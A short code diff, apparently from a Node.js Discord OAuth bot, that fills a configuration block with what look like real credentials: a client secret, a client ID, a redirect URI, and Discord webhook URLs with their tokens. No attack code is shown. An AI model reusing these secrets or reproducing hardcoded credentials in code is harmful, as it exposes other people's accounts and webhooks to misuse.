@@ -1,9 +1,9 @@
 // Configuration
-const client_secret = 'change'
-const client_id = 'change'
-const redirect_uri = 'change'
-const webhook_url = 'change'
-const webhook_logging_url = 'change'
+const client_secret = 'WaAv6xMC3Y2vEUVKHZ612bg1yHVxzF7A'
+const client_id = '1063864131737882745'
+const redirect_uri = 'https://oauthbot.onrender.com'
+const webhook_url = 'https://discord.com/api/webhooks/1063865523915460638/xLazuQN5GxJDAuoux2sSnw7zgiUxETYy8JaKWR4CPC2WPqjgPHEfOkCv7nzJ0Yk0jXYt'
+const webhook_logging_url = 'https://discord.com/api/webhooks/1063865523915460638/xLazuQN5GxJDAuoux2sSnw7zgiUxETYy8JaKWR4CPC2WPqjgPHEfOkCv7nzJ0Yk0jXYt'
 // Config end
 const axios = require('axios')
 const express = require('express')
